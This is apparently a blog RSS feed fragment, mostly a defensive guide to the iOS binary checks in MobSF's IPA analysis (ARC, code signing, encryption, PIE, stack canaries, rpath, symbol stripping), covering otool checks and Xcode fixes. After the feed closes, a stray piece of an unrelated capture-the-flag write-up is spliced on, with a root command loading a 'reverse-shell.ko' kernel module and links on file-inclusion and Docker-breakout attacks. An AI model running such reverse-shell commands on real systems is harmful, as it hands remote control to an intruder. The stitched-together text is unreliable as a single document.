href="https://docs.swift.org/swift-book/LanguageGuide/AutomaticReferenceCounting.html">one of the core features</a> of the language. </p><p>However, <code>ARC</code> is actually a feature of the Clang compiler, and unlike with Swift, you can<em> </em>(but <a href="https://stackoverflow.com/questions/8760431/to-arc-or-not-to-arc-what-are-the-pros-and-cons/8760820#8760820">shouldn&apos;t</a>) use Objective-C without using Automatic Reference Counting.</p><p>If you&apos;ve never heard of &quot;Automatic Reference Counting&quot; you should basically know that it &quot;automatically frees up the memory used by class instances when those instances are no longer needed&quot;. </p><p>The alternative is to leave memory management to the developer, who is always less reliable and can easily make mistakes that can lead to memory corruption vulnerabilities.</p><p>So, if your application is written (at least partially) in Objective-C, you should first make sure that the project is configured to use <code>ARC</code> by checking the <code>&quot;Objective-C Automatic Reference Counting&quot;</code> setting under the <code>&quot;Build Settings&quot;</code> tab:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/image-6.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1086" height="432" srcset="inesmartins.github.io/content/images/size/w600/2021/08/image-6.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/image-6.png 1000w, inesmartins.github.io/content/images/2021/08/image-6.png 1086w"><figcaption>https://advancetechtutorial.blogspot.com/2016/07/xcode-arc-automatic-reference-counting.html</figcaption></figure><p>If this property is set to <code>No</code>, you should &quot;Convert&quot; the project, as shown below:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/image-5.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="561" height="421"><figcaption>https://stackoverflow.com/questions/8969644/tool-for-transitioning-to-arc/8969662</figcaption></figure><p>You can also check the <code>&quot;Compile Sources&quot;</code> section under the <code>&quot;Build Phases&quot;</code> tab for the presence of the <code>-fno-objc-arc</code> flag, which is used to exclude specific files from using <code>ARC</code>, as shown below:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/flag-1024x434.jpeg" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1024" height="434" srcset="inesmartins.github.io/content/images/size/w600/2021/08/flag-1024x434.jpeg 600w, inesmartins.github.io/content/images/size/w1000/2021/08/flag-1024x434.jpeg 1000w, inesmartins.github.io/content/images/2021/08/flag-1024x434.jpeg 1024w"><figcaption>https://thomashanning.com/how-to-disable-arc-for-objective-c-files/</figcaption></figure><p>Since there are limitations that come with using <code>ARC</code>, the adequacy of these exceptions should be evaluated on a case by case basis.</p><p>As mentioned above, <code>otool</code> can help us understand our binary files a little better.</p><p>When it comes to <code>ARC</code> we can use this tool to check for the presence of ARC-related symbols, such as <code>_objc_release</code>, <code>_objc_autorelease</code>, <code>_objc_storeStrong</code>, <code>_objc_retain</code>, etc.:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.52.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-I</code> and <code>-v</code> flags:</p><pre><code>~ otool
-	...
-	-I print the indirect symbol table
-	-v print verbosely (symbolically) when possible</code></pre><h2 id="code-signature">Code Signature</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.35.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1123" height="54" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.12.35.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.12.35.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.35.png 1123w"></figure><p>From the <a href="https://developer.apple.com/support/code-signing/">Apple docs on Code Signing</a> we can read:</p><blockquote>Before your app can integrate app services, be installed on a device, or be submitted to the App Store, it must be signed with a <a href="https://developer.apple.com/support/certificates/">certificate</a> issued by Apple.</blockquote><p>Also, from the <a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">iOS Security Guide</a>:</p><blockquote>In order to develop and install apps on iOS devices, developers must register with Apple and join the iOS Developer Program. The real-world identity of each developer, whether an individual or a business, is verified by Apple before their certificate is issued. <br>[...]<br>At runtime, code signature checks of all executable memory pages are made as they are loaded to ensure that an app has not been modified since it was installed or last updated.</blockquote><p>So, code signing is simply the process of signing an application with an appropriate certificate that ensures the author&apos;s identity and the app content&apos;s integrity.</p><p>Since this process is required by Apple for most operations, if this section is flagged as &quot;False&quot; by MobSF, it&apos;s likely that the file you&apos;re analysing was generated via some non-traditional method, which seems worth investigating.</p><h2 id="encrypted">Encrypted</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.17.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="55" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.14.17.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.17.png 932w"></figure><p>Similarly to the previous section, encryption shouldn&apos;t be a concern for most iOS developers, since the <code>App Store</code> takes care of it during the distribution process.</p><p>From <a href="https://iphonedev.wiki/index.php/Crack_prevention">iPhoneDev&apos;s Wiki</a>:</p><blockquote>App Store binaries are signed by both their developer and Apple. This encrypts the binary so that decryption keys are needed in order to make the binary readable.</blockquote><p>So, when it comes to the MobSF analysis you should keep in mind the origin of the <code>.ipa</code> you&apos;re testing:</p><ul><li>if you simply download it from the <code>App Store</code> (using <code>ipatool</code>, for example), then the binary should be encrypted;</li><li>if you get the <code>.ipa</code> from any other source, then most likely it&apos;s not encrypted.</li></ul><p>To confirm the binary&apos;s encryption you can use <code>otool</code> to look for the <code>LC_ENCRYPTION_INFO</code> section:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.32.27.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="462" height="120"></figure><p>From the <a href="https://iphonedev.wiki/index.php/Crack_prevention">iPhoneDev Wiki</a>:</p><blockquote>iOS can tell the encryption status of a binary via the <code>cryptid</code> struture member of <code>LC_ENCRYPTION_INFO</code> <code>MachO</code> <code>load</code> command. <br>If <code>cryptid</code> is a non-zero value then the binary in encrypted.</blockquote><p>Note that the <code>cryptsize</code> indicates the size of the encrypted segment.</p><p>Also note the usage of <code>otool</code>&apos;s <code>-l</code> flag:</p><pre><code>~ otool
-	...
-	-l print the load commands</code></pre><h2 id="nx">NX</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.38.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="930" height="76" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.14.38.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.38.png 930w"></figure><p>Although the <code>NX bit</code> is specific to the <code>AMD</code> architecture, people tend to use &quot;NX&quot; as a generic way of referring to the feature that enables you to <strong>specify non-executable memory pages</strong>. </p><p>So, in this case, the <code>NX</code> section actually refers to the <code>XN</code> or &quot;eXecute never&quot; feature, since we&apos;re dealing with an <code>ARM</code> binary.</p><p>In the <a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">iOS Security Guide</a>, under &quot;Runtime process security&quot; we can read:</p><blockquote>Further protection is provided by iOS using ARM&#x2019;s Execute Never (XN) feature, which marks memory pages as non-executable. <br>Memory pages marked as both writable and executable can be used only by apps under tightly controlled conditions: <br>The kernel checks for the presence of the Apple-only dynamic code-signing entitlement. Even then, only a single mmap call can be made to request an executable and writable page, which is given a randomized address. </blockquote><p>So, this section should never be flagged by MobSF, as long as Apple continues to use <code>XN</code> by default.</p><h2 id="pie">PIE</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.40.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="102" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.15.40.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.40.png 932w"></figure><p>As explained above, each time you run a &quot;Position Independent Executable&quot; (<code>PIE</code>), the binary and all of its dependencies are loaded into random locations within virtual memory, which make ROP attacks much more difficult to execute reliably.</p><p>We can check for the presence of the <code>PIE</code> flag in our executable with <code>otool</code>: </p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1151" height="96" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 1151w"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-h</code> and <code>-v</code> options:</p><pre><code>~ otool
-	...
-	-h print the mach header
-	-v print verbosely (symbolically) when possible</code></pre><p>If this flag is not present in the binary, then you need to review your compilation settings.</p><p>First, ensure that <code>&quot;Don&apos;t Create Position Independent Executables&quot;</code> &#xA0;under <code>&quot;Build Settings&quot;</code> is set to <code>NO</code>:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/rHGq2.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"><figcaption>https://stackoverflow.com/questions/32728783/why-would-xcode-not-use-the-build-configuration-settings-from-my-xcconfig-file</figcaption></figure><p>Then, check that these flags are set:</p><ul><li>In <code>Other C flags</code>: <code>-fPIC</code></li><li>In <code>Other Warning flags</code>: <code>-Wl,--emit-relocs</code> (retains all relocations in the executable file) and <code>-Wl,--warn-shared-textrel</code> (warns if the text segment is not shareable).</li></ul><h2 id="stack-canary">Stack Canary</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.33.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="124" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.19.33.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.33.png 932w"></figure><p>Again we can use <code>otool</code> to check whether a binary is using stack canaries by looking for some specific symbols, such as <code>_stack_chk_guard</code> and <code>_stack_chk_fail</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.44.30.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="434" height="150"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-I</code> and <code>-v</code> flags:</p><pre><code>~ otool
-	...
-	-I print the indirect symbol table
-	-v print verbosely (symbolically) when possible</code></pre><p>If the stack canary is not present, you need to ensure that the <code>-fstack-protector-all</code> flag is set under <code>&quot;Other C Flags&quot;</code>, on your project&apos;s <code>&quot;Build Settings&quot;</code> tab, as shown below:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-22.50.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="881" height="165" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-22.50.58.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-22.50.58.png 881w" sizes="(min-width: 720px) 720px"></figure><h2 id="rpath">Rpath</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="933" height="103" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.15.58.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.58.png 933w"></figure><p>The &quot;Runpath Search Path&quot; instructs the dynamic linker to search for a dynamic library (dylib) on an ordered list of paths ... sort of like how Unix looks for binaries on <code>$PATH</code>.</p><p>This is an issue because it makes it possible for an attacker to place a malicious dylib in one of the first paths that doesn&apos;t contain the library that the linker is trying to locate, therefore hijacking it.</p><p>A simple way to check whether or not your application&apos;s libraries were compiled using <code>rpath</code> is to run <code>otool</code> with the <code>-L</code> flag, which lists all Mach-O Shared Libraries:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1324" height="245" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 1324w" sizes="(min-width: 1200px) 1200px"></figure><p>Note that some of the libraries are prefixed with <code>@rpath</code>, while others are prefixed by the absolute path.</p><p>Also, if you already have access to the full MobSF Static Analysis report, you can simply scroll down to the &quot;Libraries&quot; section and check which are prefixed by <code>@rpath</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.27.32.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="990" height="382" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-21.27.32.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.27.32.png 990w"></figure><p>If your application uses the <a href="https://www.swift.org/package-manager/">Swift Package Manager</a>, in order to compile the libraries without <code>rpath</code> you need to use some hidden build flags. On your local command line run:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-19-at-19.33.44.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="943" height="92" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-19-at-19.33.44.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-19-at-19.33.44.png 943w"></figure><p>Note the swift compiler option <code>no-stdlib-rpath</code> which disables <code>rpath</code> entries during compilation.</p><p>Configure your build settings so that the application is built with this configuration flag, e.g.: <code>swift build -c release -Xswiftc -no-toolchain-stdlib-rpath</code>.</p><p>Alternatively, if your application uses <a href="https://cocoapods.org/">Cocoapods</a>, you can first check the install directory of the pods:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-13-at-13.15.10.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>And then use the following configuration on your <code>Podfile</code>:</p><pre><code class="language-ruby">post_install do |installer|
-  installer.pods_project.targets.each do |target|
-    target.build_configurations.each do |config|
-      config.build_settings[&apos;DYLIB_INSTALL_NAME_BASE&apos;] = &lt;your-install-directory&gt;
-    end
-  end
-end</code></pre><p>So, the result would looks something like this:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-13-at-13.16.08.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><h2 id="symbols-stripped">Symbols Stripped</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.40.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>From Apple&apos;s <a href="https://developer.apple.com/documentation/xcode/building-your-app-to-include-debugging-information">Building Your App to Include Debugging Information</a>:</p><blockquote>When Xcode compiles your source code into machine code, it generates a list of symbols in your app&#x2014;class names, global variables, and method and function names. <br>These symbols correspond to the file and line numbers where they&#x2019;re defined; this association creates a <em><em>debug symbol</em></em>, so you can use the debugger in Xcode, or refer to line numbers reported by a crash report. <br>Debug builds of an app place the debug symbols inside the compiled binary file by default, while <strong>release builds of an app place the debug symbols in a companion <em><em>Debug Symbol file</em></em> </strong>(<code>dSYM</code>) to reduce the size of the distributed app.</blockquote><p>So, the good thing about these <code>dSYM</code> files is that you can store them separately and then use them to <a href="https://developer.apple.com/documentation/xcode/adding-identifiable-symbol-names-to-a-crash-report">symbolicate</a> your logs without actually letting the end user have access to them via App Store:</p><pre><code>~ symbolicatecrash &quot;&lt;path-to-crash-file&gt;&quot; &quot;&lt;path-to-dSYM file&gt;&quot; &gt; symbolicated.crash</code></pre><p>By default, <code>dSYM</code> files are generate for &quot;Release&quot; builds, which you can check by reviewing your <code>&quot;Build Settings&quot;</code>:</p><ul><li><code>Generate Debug Symbols</code> = <code>YES</code></li><li><code>Debug Information Format</code> = <code>DWARF with dSYM File</code></li></ul><p>A simple way to check whether or not your application was compiled with debug symbols is to again run <code>otool</code> with the <code>-Iv</code> flags:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.32.20.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>Alternatively, you can use <code>nm</code>, which &quot;displays the name list (symbol table) of each &#xA0;object file in the argument list&quot;.</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.43.08.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1101" height="474" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-22-at-11.43.08.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-22-at-11.43.08.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.43.08.png 1101w"></figure><p>If MobSF flags you project as containing debug symbols, please ensure that your project&apos;s <code>&quot;Build Settings&quot;</code> contain the following <code>&quot;Release&quot;</code> configurations:</p><ul><li><code>Deployment Postprocessing</code> = <code>YES</code>;</li><li><code>Strip Debug Symbols During Copy</code> = <code>YES</code>;</li><li><code>Strip Linked Product</code> = <code>YES</code>;</li><li><code>Strip Style</code> = <code>All Symbols</code>;</li><li><code>Strip Swift Symbols</code> = <code>YES</code></li></ul><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/image-1.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="965" height="709" srcset="inesmartins.github.io/content/images/size/w600/2022/01/image-1.png 600w, inesmartins.github.io/content/images/2022/01/image-1.png 965w"></figure><p>Finally, note that you can actually manually strip your binary, but as shown below, this invalidates the code signature:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.46.45.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1410" height="49" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-22-at-11.46.45.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-22-at-11.46.45.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.46.45.png 1410w" sizes="(min-width: 1200px) 1200px"></figure><hr><h2 id="useful-links">Useful Links</h2><ul><li><a href="http://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/">http://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/</a></li><li><a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf</a></li><li><a href="https://iphonedev.wiki/index.php/Crack_prevention">https://iphonedev.wiki/index.php/Crack_prevention</a></li><li><a href="https://blog.krzyzanowskim.com/2018/12/05/rpath-what/">https://blog.krzyzanowskim.com/2018/12/05/rpath-what/</a></li><li><a href="https://objective-see.com/blog/blog_0x46.html">https://objective-see.com/blog/blog_0x46.html</a></li><li><a href="https://stackoverflow.com/questions/3656391/whats-the-dsym-and-how-to-use-it-ios-sdk">https://stackoverflow.com/questions/3656391/whats-the-dsym-and-how-to-use-it-ios-sdk</a></li></ul>]]></content:encoded></item></channel></rss>
+root@79931c1ed9a2:/# insmod reverse-shell.ko</code></pre><p>And that&apos;s it!</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-02-at-14.13.45.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><hr><h2 id="references">References</h2><ul><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></li><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html">https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html</a></li><li><a href="https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/">https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/</a></li><li><a href="https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32</a></li><li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress">https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress</a></li><li><a href="https://alexander.holbreich.org/docker-components-explained/">https://alexander.holbreich.org/docker-components-explained/</a></li><li><a href="https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md">https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md</a></li><li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket</a></li><li><a href="https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</a></li><li><a href="https://blog.nody.cc/posts/container-breakouts-part2/">https://blog.nody.cc/posts/container-breakouts-part2/</a></li></ul>]]></content:encoded></item></channel></rss>
